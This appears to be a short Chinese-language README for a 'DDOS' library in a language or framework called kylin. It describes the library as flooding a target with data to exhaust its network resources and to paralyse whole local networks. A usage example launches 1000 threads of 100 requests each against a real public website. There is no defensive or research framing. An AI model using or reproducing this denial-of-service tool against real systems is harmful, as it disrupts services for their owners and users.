# DDOS库
kylin最基础的类库之一，用于大规模发送海量数据用来堵塞对方网络资源。
- 注意: 网络资源的消耗是相对的，攻击别人消耗的网络资源也会消耗自己的网络资源.
- 主要设计为瘫痪整个局域网

```
import "DDOS"

var ddos = new(DDOS)
# 开启 1000 个线程同时发送
ddos.set_user(1000)
# 每个线程发送 100 条请求
ddos.set_number(100)
# 攻击目标网站.
ddos.attack("https://www.baidu.com/")
```